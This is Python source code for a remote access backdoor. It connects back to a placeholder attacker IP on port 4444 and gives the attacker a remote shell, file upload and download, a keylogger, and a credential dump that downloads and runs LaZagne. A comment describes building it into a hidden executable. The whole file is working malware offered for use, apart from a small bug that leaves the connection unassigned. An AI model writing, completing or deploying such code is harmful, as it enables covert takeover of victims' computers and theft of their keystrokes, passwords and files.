import base64
import os
import socket
import json
import subprocess
from pynput.keyboard import Key, Listener
import logging, threading, requests, tempfile


# To create a Executable
# pyinstaller.exe ..\client.py --onefile --noconsole
class Backdoor:

    def __init__(self, ip, port):
        self.conn = None
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((ip, port))
        except:
            print("[-] Socket Connection failed.")


    def receive(self):
        json_result = ''
        while True:
            try:
                json_result += self.conn.recv(1024).decode()
                result = json.loads(json_result)
                return result
            except:
                continue


    def send(self, data):
        data = base64.b64encode(data)
        json_data = json.dumps(data.decode())
        self.conn.send(json_data.encode())


    def execute_remote_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except Exception:
            return b"[-] failed to execute command."


    def change_working_directory(self, command):
        try:
            os.chdir(command.split(' ')[1])
            return b"[+] Directory Changed"
        except Exception:
            return b"[-] Failed to change directory"


    def download_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except Exception:
            return b"[-] File not found."


    def keyscan_start(self):
        logging.basicConfig(filename=("keylog.txt"), level = logging.DEBUG, format = "%(asctime)s %(message)s")

        def on_press(key):
            logging.info(str(key))

        with Listener(on_press=on_press) as listener:
            listener.join()


    def keyscan_dump(self):
        result = self.download_file("keylog.txt")
        return result

    def upload_file(self, path, content):
        try:
            with open(path, 'wb') as file:
                file.write(base64.b64decode(content))
                return b"[+] File uploaded."
        except Exception:
            return b"[-] File write error.."


    def creds_dump(self):
        url = "Paste the URL of the lazagne file from github"
        content = requests.get(url).content
        pwd = os.getcwd()
        os.chdir(tempfile.gettempdir())
        with open('lazagne.exe', 'wb') as file:
            file.write(content)
        result = subprocess.check_output("lazagne.exe all", shell=True)
        os.remove("lazagne.exe")
        os.chdir(pwd)
        return result


    def run(self):
        while True:
            try:
                data = self.receive()
                if(data.split(' ')[0]) == 'cd':
                    result = self.change_working_directory(data)

                elif (data.split(' ')[0]) == 'download':
                    result = self.download_file(data.split(' ')[1])

                elif (data.split(' ')[0]) == 'keyscan_start':
                    result = b"[+] Keyscan started."
                    t = threading.Thread(target=self.keyscan_start, daemon = True)
                    t.start()

                elif (data.split(' ')[0]) == 'keyscan_dump':
                    result = self.keyscan_dump()

                elif (data.split(' ')[0]) == 'upload':
                    result = self.upload_file(data.split(' ')[1], data.split(' ')[2])

                elif (data.split(' ')[0] == 'creds_dump'):
                    result = self.creds_dump()

                elif (data.split(' ')[0] == 'exit'):
                    self.conn.close()
                    exit(0)

                else:
                    result = self.execute_remote_command(data)

                self.send(result)

            except KeyboardInterrupt:
                exit(0)


backdoor = Backdoor("attacker's IP", 4444)
backdoor.run()